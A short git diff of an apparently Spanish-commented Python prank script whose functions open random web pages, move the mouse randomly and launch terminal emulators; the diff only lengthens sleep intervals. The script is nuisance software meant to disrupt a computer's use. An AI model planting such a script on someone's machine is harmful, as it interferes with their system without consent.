@@ -32,7 +32,7 @@ def webOpen():
                     'http://4.bp.blogspot.com/-w6UkeTKqd3E/UpdEMzDKJFI/AAAAAAAAFEE/rh0BkH-AklU/s1600/3d-trollface-nodding-ok-yes-agree-troll-face.gif'
                )
                open(choice(tup_searches))
-               sleep(10)               
+               sleep(15)               
                
      except KeyboardInterrupt:
           print("XD")
@@ -46,7 +46,7 @@ def annoying_behavior():
 #              Esto básicamente mueve el ratón a una
 #              posición aleatoria comprendida entre
 #              1 y 256
-               sleep(2)
+               sleep(10)
                
 #              Intenta abrir diferentes emuladores
 #              de terminal
